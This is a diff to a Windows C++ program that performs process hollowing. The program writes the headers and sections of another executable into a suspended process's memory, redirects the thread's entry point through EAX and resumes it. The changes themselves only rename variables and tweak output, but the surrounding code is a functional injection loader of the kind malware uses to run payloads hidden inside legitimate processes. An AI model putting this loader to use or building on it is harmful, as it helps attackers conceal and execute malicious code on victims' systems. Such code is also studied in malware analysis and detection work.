@@ -59,14 +59,14 @@ int main()
 	PIMAGE_NT_HEADERS pNTHeaderResource = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + (DWORD)pDosHeader->e_lfanew);
 	
 	/* Allocate virtual memory for the process which is to be injected */
-	LPVOID baseAddress = VirtualAllocEx(pi.hProcess, pPeb->ImageBaseAddress, pNTHeaderResource->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	LPVOID baseAddressInjectedPE = VirtualAllocEx(pi.hProcess, pPeb->ImageBaseAddress, pNTHeaderResource->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
 	PBYTE pHeader = new BYTE[pNTHeaderResource->OptionalHeader.SizeOfHeaders];
 
 	memcpy(pHeader, pDosHeader, pNTHeaderResource->OptionalHeader.SizeOfHeaders);
 
 	/* Copy the headers of the process that is to be injected into the created process */
-	if (!WriteProcessMemory(pi.hProcess, baseAddress, pHeader, pNTHeaderResource->OptionalHeader.SizeOfHeaders, NULL))
+	if (!WriteProcessMemory(pi.hProcess, baseAddressInjectedPE, pHeader, pNTHeaderResource->OptionalHeader.SizeOfHeaders, NULL))
 	{
 		printf("Failed: Unable to write headers: %i", GetLastError());
 		return -1;
@@ -82,7 +82,7 @@ int main()
 		PBYTE section = new BYTE[(DWORD)pSectionHeader->SizeOfRawData];
 		memcpy(section, (PVOID)((DWORD)pDosHeader + (DWORD)pSectionHeader->PointerToRawData), (DWORD)pSectionHeader->SizeOfRawData);
 
-		if (!WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)baseAddress + (DWORD)pSectionHeader->VirtualAddress), section, (DWORD)pSectionHeader->SizeOfRawData, NULL))
+		if (!WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)baseAddressInjectedPE + (DWORD)pSectionHeader->VirtualAddress), section, (DWORD)pSectionHeader->SizeOfRawData, NULL))
 		{
 			printf("Failed copying data from %s: %i", pSectionHeader->Name, GetLastError());
 			return -1;
@@ -92,23 +92,23 @@ int main()
 
 
 	/* Retrieve the suspended procceses current context */
-	PCONTEXT lpContext = new CONTEXT();
-	lpContext->ContextFlags = CONTEXT_FULL;
-	GetThreadContext(pi.hThread, lpContext);
+	PCONTEXT pContext = new CONTEXT();
+	pContext->ContextFlags = CONTEXT_FULL;
+	GetThreadContext(pi.hThread, pContext);
 
 	/* Set the Orginal Entry Point (OEP) value */
-	lpContext->Eax = (DWORD)baseAddress + (DWORD)pNTHeaderResource->OptionalHeader.AddressOfEntryPoint;
+	pContext->Eax = (DWORD)baseAddressInjectedPE + (DWORD)pNTHeaderResource->OptionalHeader.AddressOfEntryPoint;
 
 	/* Set the suspended exe context with the updated eax value which points to the injected code */
-	SetThreadContext(pi.hThread, lpContext);
+	SetThreadContext(pi.hThread, pContext);
 
 	/* Resume the created processes main thread with the updated OEP */
 	ResumeThread(pi.hThread);
 
 
-	printf("Created Process id: %i\n", pi.dwProcessId);
+	printf("\nCreated Process id: %i\n", pi.dwProcessId);
 	printf("Created process Image Base Address 0x%p\n", pPeb->ImageBaseAddress);
-	printf("Injected process Image Base Address 0x%p\n", baseAddress);
+	printf("Injected process Image Base Address 0x%p\n", baseAddressInjectedPE);
 
 	return 0;
 }
